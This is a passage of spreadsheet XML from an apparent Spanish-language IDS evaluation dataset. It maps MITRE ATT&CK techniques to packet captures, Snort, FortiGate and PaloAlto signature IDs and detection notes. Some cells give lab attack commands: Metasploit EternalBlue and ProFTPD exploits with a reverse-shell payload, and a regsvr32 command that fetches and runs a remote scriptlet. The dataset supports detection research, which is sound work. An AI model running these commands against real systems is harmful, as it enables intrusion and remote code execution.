      </rPr>
      <t xml:space="preserve">2035480, </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF57BB8A"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>2025644</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>, 2022858, 2016141, 2018959</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">1917, 50447, 2002752, 2002749, 2001117, 2035480, 2000419, </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="7"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>2025644</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">, 2101917, 2022858, 2016141, 2003595, 2021076, 2018959, 2101200, 2101620
</t>
    </r>
  </si>
  <si>
    <t>1917, 2002752, 2002749, 50447, 2101917, 2101620</t>
  </si>
  <si>
    <t>1917, 2002752, 2002749, 50447, 2101917, 2101620, 2001117, 2016141, 2101200</t>
  </si>
  <si>
    <t xml:space="preserve">2035480, 2000419, 2025644, 2022858, 2003595, 2018959
</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Flujos Detectados Snort</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">: Snortv2 no analiza 2 flujos, uno ICMPv6 y otro IGMP, mientras que Snortv3 cuenta los reseteos de conexión como conexiones nuevas, provocando más flujos de la cuenta. Esto no afecta al resultado final.                                                                                      </t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve"> Instancias Colaterales</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>: el ataque contiene la descarga del malware, pero se trata de un paso previo indispensable más que el propio ataque en sí, por lo que se considera como ataque colateral</t>
    </r>
  </si>
  <si>
    <t>15893, 33224</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">Ataques Colaterales: </t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>FortiGate detecta el uso de un Shell Remoto</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color theme="1"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t>Flujos detectados PA:</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color theme="1"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve"> PaloAlto no detec protocolos como MDNS o ICMPv6</t>
    </r>
  </si>
  <si>
    <t>Trusted Relationship</t>
  </si>
  <si>
    <t>T1199</t>
  </si>
  <si>
    <t>Uso de una conexión RDP sin proteger para el acceso a un equipo</t>
  </si>
  <si>
    <t>RDP</t>
  </si>
  <si>
    <t>T1199-Trusted_relationship_[4].pcapng</t>
  </si>
  <si>
    <t xml:space="preserve">El ataque tiene un matiz clave. Si bien el ataque puede ser detectado por Snort (existen muchas variantes, aunque para esta instancia concreta, por ejemplo, sí que existe mecanismo de detección), el hecho de que se trate de un ataque procedente de un dominio de confianza infectado, dificulta su detección, pues bloquear estos paquetes podría imposibilitar comunicación con el dominio de confianza si no existiera amenaza </t>
  </si>
  <si>
    <t>Manual [4] /  3.5</t>
  </si>
  <si>
    <t>Manual [4] / B.5</t>
  </si>
  <si>
    <t>Manual [4] / 4.5</t>
  </si>
  <si>
    <t>El uso de una conexión RDP para ganar acceso a un equipo no siempre constituye un ataque, depende del contexto</t>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">2001330, </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>1448</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">2001330, </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>1448</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">2001330, </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>1448</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">2001330, </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>1448</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">2001330, </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>1448</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">2001330, </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>1448</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>2034857</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">,  2101448,  2101447,  </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>2001329,</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">  2001330,  2009207,  2009206,  2009205,  2009208,  2002752,  2002749,  1448</t>
    </r>
  </si>
  <si>
    <t>1448, 2001330, 2101448, 20101447, 2001329, 2009207, 2009206, 2009205, 2009208</t>
  </si>
  <si>
    <t>2009207, 2009206, 2009205, 2009208</t>
  </si>
  <si>
    <t>1448, 2001330, 2101448, 20101447, 2001329</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Flujos Detectados Snort</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>: Snortv2 no analiza un flujo ICMP, pero no afecta a los resultados</t>
    </r>
  </si>
  <si>
    <t>ms-rdp -- remote-access</t>
  </si>
  <si>
    <t>Hardware Additions</t>
  </si>
  <si>
    <t>T1200</t>
  </si>
  <si>
    <t>Adición de Hardware</t>
  </si>
  <si>
    <t>SSH Server + USB(Simular USB con MV con SO)</t>
  </si>
  <si>
    <t>T1200-Hardware_Additions_[5].pcapng</t>
  </si>
  <si>
    <t>Detección por anomalías que identifique desviaciones en el tráfico de red, tales como metadatos o protocolos de gestión (DHCP,...) fuera de los habituales</t>
  </si>
  <si>
    <t>Aparición de una nueva MV en el entorno de la víctima simulando la insercion de un USB tipo Pwn Plug que se utiliza como nodo de acceso a la red de la víctima para posteriormente, aprovechando que el puerto de la víctima esta abierto, acceder al equipo.</t>
  </si>
  <si>
    <t>Manual [5] /  4.2.1</t>
  </si>
  <si>
    <t>Manual [5] / C.6</t>
  </si>
  <si>
    <t xml:space="preserve"> Manual [5] / 5.3.4</t>
  </si>
  <si>
    <t>Añadir un equipo hardware a una red siempre es un ataque</t>
  </si>
  <si>
    <t>Exploitation for Client Execution</t>
  </si>
  <si>
    <t>T1203</t>
  </si>
  <si>
    <t>Ataque con Botnet</t>
  </si>
  <si>
    <t>Ares, Screenshot and key logging</t>
  </si>
  <si>
    <t>Manual [4] / B.35</t>
  </si>
  <si>
    <t>Un ataque con botnet siempre es un ataque</t>
  </si>
  <si>
    <t>2009714, 50447, 31939, 31860, 7070, 15188</t>
  </si>
  <si>
    <t>2002749, 2002752, 2012885, 2009004, 2009714, 50447, 31939, 31860, 7070, 15188</t>
  </si>
  <si>
    <t xml:space="preserve">9999, 14984, 55310, 94328, </t>
  </si>
  <si>
    <t>User Execution</t>
  </si>
  <si>
    <t>T1204</t>
  </si>
  <si>
    <t>Malicious Link</t>
  </si>
  <si>
    <t>T1204.001</t>
  </si>
  <si>
    <t>Enlace malicioso</t>
  </si>
  <si>
    <t>wget</t>
  </si>
  <si>
    <t>T1204.001-malicious_link_[3].pcapng</t>
  </si>
  <si>
    <t>Deteccion por listas negras/anomalías</t>
  </si>
  <si>
    <t>Redireccion al pinchar en un enlace a un sitio malicioso. Comando : wget http://172.16.1.2 (Desde la víctima)</t>
  </si>
  <si>
    <t>Manual [3] /  3.8.17</t>
  </si>
  <si>
    <t>Manual [3] / 3.8.17.4</t>
  </si>
  <si>
    <t>Manual [3] / 3.8.17.5</t>
  </si>
  <si>
    <t>Un enlace malicioso a veces puede ser considerado como tráfico legítimo dependiendo de las circuntstancias</t>
  </si>
  <si>
    <t>Defense Evasion, Persistence</t>
  </si>
  <si>
    <t>Traffic Signaling</t>
  </si>
  <si>
    <t>T1205</t>
  </si>
  <si>
    <t>Port Knocking</t>
  </si>
  <si>
    <t>T1205.001</t>
  </si>
  <si>
    <t>Esconder y activar un puerto de forma remota</t>
  </si>
  <si>
    <t>Knockd</t>
  </si>
  <si>
    <t>T1205.001-Port_Knocking_[3].pcapng</t>
  </si>
  <si>
    <t>Detección por anomalías en base a una actividad sospechosa en un puerto concreto</t>
  </si>
  <si>
    <t>Ocultar y activar un puerto remotamente, haciendo primero peticiones a ciertos puertos de forma secuencial. Comando: knock -v 172.16.2.2 7000 8000 9000</t>
  </si>
  <si>
    <t>Manual [3] /  3.8.11</t>
  </si>
  <si>
    <t>Manual [3] / 3.8.11.4</t>
  </si>
  <si>
    <t>Manual [3] / 3.8.11.5</t>
  </si>
  <si>
    <t>El Port Knocking siempre se considera un ataque</t>
  </si>
  <si>
    <t>Rogue Domain Controller</t>
  </si>
  <si>
    <t>T1207</t>
  </si>
  <si>
    <t>DCShadow: registro de un DC fraudulento para habilitar la manipulación de datos en un entorno Active Directory</t>
  </si>
  <si>
    <t>T1207-Rogue_domain_controller_[4].pcapng</t>
  </si>
  <si>
    <t>Regla que detecte una llamada a la función DRSUAPI_REPLICA_ADD (5), o un intento de aprovechamiento de una vulnerabilidad de la misma</t>
  </si>
  <si>
    <t>Manual [4] /  3.10</t>
  </si>
  <si>
    <t>Manual [4] / B.10</t>
  </si>
  <si>
    <t>Manual [4] / 4.10</t>
  </si>
  <si>
    <t>El registro de un DC fraudulento para habilitar la manipulación de datos siempre es un ataque (aunque las tareas realizadas posteriormente puedan realizarse también en un entorno legítimo)</t>
  </si>
  <si>
    <t>44604, 44489, 53374, 53375</t>
  </si>
  <si>
    <t>53374, 53375</t>
  </si>
  <si>
    <t>2002752, 2002749, 2044666, 44604, 44489, 53374, 53375</t>
  </si>
  <si>
    <t>2044666, 44604, 44489, 53374, 53375</t>
  </si>
  <si>
    <t>44489, 2002752, 2002749, 2044666</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Flujos Detectados Snort</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>: ambas versiones de Snort detectan el número de flujos correcto. La variación de valores se debe puramente a la naturaleza de la identificación de flujos de Snort frente a tranalyzer</t>
    </r>
  </si>
  <si>
    <t>56497, 92322, 54406</t>
  </si>
  <si>
    <t>Exploitation of Remote Services</t>
  </si>
  <si>
    <t>T1210</t>
  </si>
  <si>
    <t>EternalBlue</t>
  </si>
  <si>
    <t>T1210-Eternal_blue_[2].pcapng</t>
  </si>
  <si>
    <t>SMB</t>
  </si>
  <si>
    <t>Regla genérica que detecte uso de EternalBlue</t>
  </si>
  <si>
    <t>Uso de exploit Eternalblue para obtener movimiento lateral y establecimiento de meterpreter. Comando: msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.2.2; set LHOST 192.168.1.3; run -z; sessions -c getuid; sessions -k 1; exit"</t>
  </si>
  <si>
    <t>Manual [2] /  3.1.7.1</t>
  </si>
  <si>
    <t>Manual [4] / B.29</t>
  </si>
  <si>
    <t>Manual [2] / 4.1.1.4</t>
  </si>
  <si>
    <t>El aprovechamiento de vulnerabilidades en el servicio SMB para realizar diferentes tareas maliciosas siempre constituye un ataque</t>
  </si>
  <si>
    <t>42944, 2102465, 2025992, 2025649, 2025650, 2024297, 2035480, 2025644</t>
  </si>
  <si>
    <t>42944, 2102465, 2035480, 2025644</t>
  </si>
  <si>
    <t>2025992, 2025649, 2025650, 2024297</t>
  </si>
  <si>
    <t>2102465, 2025992, 2025649, 2025650, 2024297, 2035480, 2025644, 44487, 44485, 44489, 5730, 42944</t>
  </si>
  <si>
    <t>2102465, 2035480, 2025644, 44487, 44485, 44489, 5730</t>
  </si>
  <si>
    <t>42944, 2025992, 2025649, 2025650, 2024297</t>
  </si>
  <si>
    <t xml:space="preserve">44487, 44485, 44489, 5730, 42944, 2002752, 2002749, 2044666, 2023997, 2044665, 2102465, 2025992, 2025649, 2025650, 2024766, 2024297, 2035480, 2000419, 2025644
</t>
  </si>
  <si>
    <t xml:space="preserve">44487, 44485, 44489, 5730, 2002752, 2002749, 2044666, 2023997, 2044665, 2102465, 2024766, 2035480, 2000419, 2025644
</t>
  </si>
  <si>
    <t xml:space="preserve">44487, 44485, 44489, 5730, 2002752, 2002749, 2044666, 2023997, 2044665, 2102465, 2035480, 2000419, 2025644
</t>
  </si>
  <si>
    <t>43799, 43963, 43796</t>
  </si>
  <si>
    <t>43796, 43963, 43799</t>
  </si>
  <si>
    <t>31696, 90807, 31710, 86360</t>
  </si>
  <si>
    <t>31696, 90807, 86360</t>
  </si>
  <si>
    <t>Ejecución de código remoto basado en vulnerabilidades de servidor FTP</t>
  </si>
  <si>
    <t>T1210-Remote_code_execution_[2].pcapng</t>
  </si>
  <si>
    <t xml:space="preserve">Regla genérica que detecte intento de ejecucion remota de codigo en servidor FTP </t>
  </si>
  <si>
    <t>Uso de comandos SITE/CPFR/CPTO en la version 1.3.5 de ProFTPD  que permite copiar ficheros a cualquier usuario no autenticado. Comando: msfconsole -x "use exploit/unix/ftp/proftpd_modcopy_exec; set RHOSTS 192.168.2.2; set SITEPATH /var/www/html; set LHOST 192.168.1.3; set LPORT 4444; set payload cmd/unix/reverse_perl; run -z; sessions -c ls; sessions -k 1; exit"</t>
  </si>
  <si>
    <t>Manual [2] /  3.1.7.2</t>
  </si>
  <si>
    <t>Manual [4] / B.30</t>
  </si>
  <si>
    <t>Manual [2] /  4.2.1.9</t>
  </si>
  <si>
    <t>La ejecución de código remoto aprovechando vulnerabilidades en el servidor FTP siempre es un ataque</t>
  </si>
  <si>
    <t>34225, 34447, 34224, 50447</t>
  </si>
  <si>
    <t>34225, 34447, 34224</t>
  </si>
  <si>
    <t>2002752, 2002749, 2010732, 34225, 34447, 34224, 50447</t>
  </si>
  <si>
    <t>2010732, 34225, 34447, 34224</t>
  </si>
  <si>
    <t>37700, 38390, 9999, 86533</t>
  </si>
  <si>
    <t>37700, 38390, 86533</t>
  </si>
  <si>
    <t>Este ataque se detecta mediante control de aplicaciones y mediante el IPS que genera alertas consideradas como TP</t>
  </si>
  <si>
    <t>Ataque Web</t>
  </si>
  <si>
    <t>DVWA, In-house selenium framework</t>
  </si>
  <si>
    <t>T1210-Web_attack-C2018_[6].pcapng</t>
  </si>
  <si>
    <t>Manual [4] / B.36</t>
  </si>
  <si>
    <t>Un ataque web siempre es considerado como tal</t>
  </si>
  <si>
    <t>50447, 31939</t>
  </si>
  <si>
    <t>50447, 31939, 2002749, 2002752, 2012885, 2009004</t>
  </si>
  <si>
    <t>9999, 14984</t>
  </si>
  <si>
    <t>Data from Information Repositories</t>
  </si>
  <si>
    <t>T1213</t>
  </si>
  <si>
    <t>T1213-SQL_inyection_[3].pcapng</t>
  </si>
  <si>
    <t>Regla genérica que detecte una inyección SQL en la URL de acceso a una página web</t>
  </si>
  <si>
    <t>Robar informacion de la victima obteniendo el contenido guardado en una tabla SQL. Comando: SELECT * FROM tabla</t>
  </si>
  <si>
    <t>Manual [3] /  3.8.6</t>
  </si>
  <si>
    <t>Manual [3] / 3.8.6.4</t>
  </si>
  <si>
    <t>Manual [3] / 3.8.6.5</t>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>2002752, 2002749</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>,</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve"> 50447</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>2002752, 2002749</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>,</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve"> 50447</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>2002752, 2002749</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>,</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve"> 50447</t>
    </r>
  </si>
  <si>
    <t>System Binary Proxy Execution</t>
  </si>
  <si>
    <t>T1218</t>
  </si>
  <si>
    <t>Regsvr32</t>
  </si>
  <si>
    <t>T1218.010</t>
  </si>
  <si>
    <t>Ejecución de COM scriptlet remoto</t>
  </si>
  <si>
    <t>Regsvr32.exe</t>
  </si>
  <si>
    <t>T1218.010-COM_Scriptlet_[2].pcapng</t>
  </si>
  <si>
    <t>Regla genérica que detecte un intento de aprovechamiento de la vulnerabilidad del servicio regsvr32 de Windows</t>
  </si>
  <si>
    <t>Aprovechar vulnerabilidad regsvr32.exe descargando y ejecutando scripts y librerias evadiendo controles de seguridad Windows. Comando: C:\Windows\system32\regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll</t>
  </si>
  <si>
    <t>Manual [2] /  3.3.1.1</t>
  </si>
  <si>
    <t>Manual [5] / C.25</t>
  </si>
  <si>
    <t>La ejecucion de un scriptlet remoto siempre se considera como un ataque</t>
  </si>
  <si>
    <t>56112, 54699</t>
  </si>
  <si>
    <t>Remote Access Software</t>
  </si>
  <si>
    <t>T1219</t>
  </si>
  <si>
    <t>Uso de TeamViewer para establecer canal de comunicación alternativo</t>
  </si>
  <si>
    <t>TeamViewer</t>
  </si>
  <si>
    <t>T1219-RemoteAccessSoftwareLocal_[5].pcapng</t>
  </si>
  <si>
    <t>UDP</t>
  </si>
  <si>
    <t>Conexion mediante TeamViewer entre dos equipos</t>
  </si>
  <si>
    <t>Manual [5] / 4.8.3</t>
  </si>
  <si>
    <t>Manual [5] / C.7</t>
  </si>
  <si>
    <t>Manual [5] /  5.11.9</t>
  </si>
  <si>
    <t>Dependiendo de las circunstancias, el uso de un software de acceso remoto puede ser tráfico legitimo</t>
  </si>
  <si>
    <t>teamviewer-sharing -- remote-access</t>
  </si>
  <si>
    <t>T1219-RemoteAccessSoftwareNAT_[5].pcapng</t>
  </si>
  <si>
    <t>59597, 24094, 254, 24097, 24096</t>
  </si>
  <si>
    <t>59597, 254</t>
  </si>
  <si>
    <t>24096, 24097, 24094</t>
  </si>
  <si>
    <t xml:space="preserve">59597, 24094, 254, 24097, 24096, 2002752, 2002749
</t>
  </si>
  <si>
    <t xml:space="preserve">59597, 254, 2002752, 2002749
</t>
  </si>
  <si>
    <t>24096, 24094, 24097</t>
  </si>
  <si>
    <t>teamviewer-web -- remote access</t>
  </si>
  <si>
    <t>93031, 9999, 14984, 14978</t>
  </si>
  <si>
    <t>Template Injection</t>
  </si>
  <si>
    <t>T1221</t>
  </si>
  <si>
    <t>Inyectar un fichero mediante Phishing .docx con macros modificadas que permita pasar desapercibido</t>
  </si>
  <si>
    <t>Sitios web convencionales (Gmail)</t>
  </si>
  <si>
    <t>T1221-Template_Injection_[5].pcapng</t>
  </si>
  <si>
    <t>Regla genérica que detecte la inyección de macros o plantillas para llevar a cabo un ataque de Phishing, usando como medio mecanismos convencionales de comunicación (mensajes SMTP, por ejemplo)</t>
  </si>
  <si>
    <t>Modificación de fichero .docx para, mediante macros, provocar la descarga y ejecución de malware en el equipo víctima</t>
  </si>
  <si>
    <t>Manual [5] / 4.4.1</t>
  </si>
  <si>
    <t>Manual [5] / C.8</t>
  </si>
  <si>
    <t>Manual [5] /  5.6.5</t>
  </si>
  <si>
    <t>El tráfico puede parecer ser legítimo en una inyección de plantilalas (.DOTM)</t>
  </si>
  <si>
    <t>46979, 402, 1917</t>
  </si>
  <si>
    <t>402, 1917</t>
  </si>
  <si>
    <t>46979, 402, 1917, 2031379, 2041131, 2016141, 2035480, 2025644</t>
  </si>
  <si>
    <t>402, 1917, 2041131, 2016141, 2035480</t>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">2031379, </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF57BB8A"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>2025644</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>, 46979</t>
    </r>
  </si>
  <si>
    <t>2031379, 2041131, 2016141, 2035480, 2025644, 50447, 46979, 402, 1917</t>
  </si>
  <si>
    <t>2041131, 2016141, 2035480, 50447, 402, 1917</t>
  </si>
  <si>
    <t>2031379, 2025644, 46979</t>
  </si>
  <si>
    <t xml:space="preserve">50447, 46979, 402, 1917, 2002752, 2002749, 2031379, 2041131, 2013491, 2013490, 2009768, 2100402, 2101917, 2016141, 2003595, 2035480, 2000419, 2025644
</t>
  </si>
  <si>
    <t xml:space="preserve">50447, 402, 1917, 2002752, 2002749, 2041131, 2013491, 2013490, 2009768, 2100402, 2101917, 2016141, 2003595, 2035480, 2000419
</t>
  </si>
  <si>
    <t>402, 50447, 2002752, 2002749, 2013491, 2013490, 2009768, 2100402</t>
  </si>
  <si>
    <t xml:space="preserve">46979, 2031379, 2025644
</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Flujos Detectados Snort</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">: la diferencia entre los flujos detectados se debe a la interpretación de flujos de Snortv3 (no hay pérdidas) y a un flujo ICMP no identificado por Snortv2 (no afecta a los resultados).                                                                    </t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Instancias Colaterales</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>: el ataque contiene un establecimiento previo de sesión mediante Metasploit. Tanto este ataque colateral como el principal son detectados.</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">Ataques Colaterales: </t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>FortiGate detecta el establecimiento de la sesión con un shell remoto</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="14"/>
        <color theme="1"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t xml:space="preserve">9999, </t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color theme="7"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t>33515</t>
    </r>
  </si>
  <si>
    <t>PaloAlto detecta la URL correspondiente a la plantilla .dotm descarga</t>
  </si>
  <si>
    <t>Domain Trust Discovery</t>
  </si>
  <si>
    <t>T1482</t>
  </si>
  <si>
    <t>Descubrimiento de dominios de confianza en entorno Active Directory</t>
  </si>
  <si>
    <t>dsquery</t>
  </si>
  <si>
    <t>T1482-Domain_trust_discovery_[4].pcapng</t>
  </si>
  <si>
    <t>LDAP</t>
  </si>
  <si>
    <t>Regla personalizada que detecte paquetes LDAP, procedentes de equipos que no son DC en la red (configurable manualmente) y con la cadena objectClass=trustedDomain</t>
  </si>
  <si>
    <t>Manual [4] /  3.13</t>
  </si>
  <si>
    <t>Manual [4] / B.13</t>
  </si>
  <si>
    <t>Manual [4] / 4.13</t>
  </si>
  <si>
    <t>El descubrimiento de dominios de confianza puede ser una actividad legítima</t>
  </si>
  <si>
    <t>2002752, 2002749, 44604</t>
  </si>
  <si>
    <t>Impact</t>
  </si>
  <si>
    <t>Defacement</t>
  </si>
  <si>
    <t>T1491</t>
  </si>
  <si>
    <t>Internal Defacement</t>
  </si>
  <si>
    <t>T1491.001</t>
  </si>
  <si>
    <t>Modificar fondo de pantalla equipo victima</t>
  </si>
  <si>
    <t>T1491.001-Internal_Defacement_[5].pcapng</t>
  </si>
  <si>
    <t>Detectable por listas negras/anomalías</t>
  </si>
  <si>
    <t>Manual [5] / 4.10.1</t>
  </si>
  <si>
    <t>Manual [5] / C.9</t>
  </si>
  <si>
    <t>Manual [5] /  5.13.1</t>
  </si>
  <si>
    <t>Esta acción puede considerarse tráfico legítimo</t>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">1917, 2035480, </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF34A853"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>2025644</t>
    </r>
  </si>
  <si>
    <t>1917, 2035480</t>
  </si>
  <si>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">1917, 2035480, </t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color rgb="FF34A853"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>2025644</t>
    </r>
  </si>
  <si>
    <t>2002752, 2002749, 2035480, 2000419, 2025644, 2101917, 1917</t>
  </si>
  <si>
    <t>2002752, 2002749, 2035480, 2000419, 2101917, 1917</t>
  </si>
  <si>
    <t>2035480, 2000419</t>
  </si>
  <si>
    <t>2002752, 2002749, 1917, 2101917</t>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>Instancias Colaterales</t>
    </r>
    <r>
      <rPr>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t>: el ataque contiene un establecimiento de conexión mediante Metasploit detectado correctamente por Snort. El ataque en sí, sin embargo, no es detectado.</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <b/>
        <sz val="14"/>
        <color rgb="FF000000"/>
        <rFont val="Arial, sans-serif"/>
      </rPr>
      <t xml:space="preserve">Ataques Colaterales: </t>
    </r>
    <r>
      <rPr>
